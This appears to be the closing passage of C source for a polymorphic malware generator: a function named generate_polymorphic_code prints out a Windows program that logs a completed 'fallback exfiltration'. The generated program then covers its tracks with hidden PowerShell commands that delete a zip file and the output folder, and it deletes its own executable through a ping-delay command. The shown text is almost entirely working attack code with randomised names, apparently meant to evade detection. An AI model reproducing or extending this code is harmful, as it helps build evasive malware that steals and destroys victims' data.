    fprintf(output, "        if (log) { fprintf(log, \"Failed to write %%s: %%lu\\n\", fallback_path, GetLastError()); fclose(log); }\n");
    fprintf(output, "        CloseHandle(hOut);\n");
    fprintf(output, "        free(b64);\n");
    fprintf(output, "        goto cleanup;\n");
    fprintf(output, "    }\n");
    fprintf(output, "    CloseHandle(hOut);\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Fallback exfiltration completed to %%s\\n\", fallback_path); fclose(log); }\n");
    fprintf(output, "    free(b64);\n");
    fprintf(output, "cleanup:\n");
    fprintf(output, "    DWORD cleanup_start_time = GetTickCount();\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Cleanup started\\n\"); fclose(log); }\n");
    fprintf(output, "    ShellExecuteA(NULL, \"open\", \"powershell.exe\", \"-Command \\\"Remove-Item -Path '%%s' -ErrorAction SilentlyContinue\\\"\", zip_path, SW_HIDE);\n");
    fprintf(output, "    ShellExecuteA(NULL, \"open\", \"powershell.exe\", \"-Command \\\"Remove-Item -Path '%%s\\\\*' -Recurse -ErrorAction SilentlyContinue\\\"\", %s, SW_HIDE);\n", var_out_dir);
    fprintf(output, "    char cmd[256];\n");
    fprintf(output, "    if (snprintf(cmd, sizeof(cmd), \"cmd.exe /C ping 127.0.0.1 -n 2 > nul & del /F /Q \\\"%%s\\\"\", argv[0]) < sizeof(cmd)) {\n");
    fprintf(output, "        system(cmd);\n");
    fprintf(output, "    }\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Cleanup completed, took %%lu ms\\n\", GetTickCount() - cleanup_start_time); fclose(log); }\n");
    fprintf(output, "    log = fopen(\"C:\\\\Users\\\\Public\\\\debug.txt\", \"a\");\n");
    fprintf(output, "    if (log) { fprintf(log, \"Program completed, total time %%lu ms\\n\", GetTickCount() - prog_start_time); fclose(log); }\n");
    fprintf(output, "    return 0;\n}\n");

    fclose(output);
    for (int i = 0; i < var_count; i++) if (vars[i]) free((void *)vars[i]);
    free(vars);
    for (int i = 0; i < func_count; i++) if (funcs[i]) free((void *)funcs[i]);
    free(funcs);
}

int main(int argc, char *argv[]) {
    generate_polymorphic_code(argc, argv);
    return 0;
}